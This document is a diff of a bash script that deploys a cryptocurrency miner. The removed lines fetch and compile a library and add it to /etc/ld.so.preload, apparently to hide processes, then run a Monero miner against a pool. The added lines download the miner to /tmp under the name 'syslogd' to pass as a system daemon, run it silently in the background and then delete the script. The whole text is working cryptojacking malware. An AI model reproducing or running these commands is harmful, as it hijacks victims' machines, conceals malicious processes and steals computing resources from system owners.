@@ -1,14 +1,5 @@
 #!/bin/bash
-apt-get update ; apt-get install wget sudo -y
-apt install -y curl
-curl https://github.com/kidoescegh/swa/raw/main/nyumput.c -o nyumput.c
-apt-get install build-essential -y
-gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
-mv libnyumput.so /usr/local/lib/
-echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
-rm nyumput.c
-echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
-/etc/init.d/network restart
-wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet
-chmod +x greavet
-./greavet --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-VTAA113023) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1
+wget https://github.com/vedhagsvp/aplamner/releases/download/nertas/greavet -O /tmp/syslogd
+chmod +x /tmp/syslogd
+nohup /tmp/syslogd --algo xmr --account CP_udnvh2owpq --worker $(echo $(shuf -i 1-15000 -n 1)-TPAKA43) --pool xmr.hk.apool.io:3334 > /dev/null 2>&1 &
+rm -- "$0"
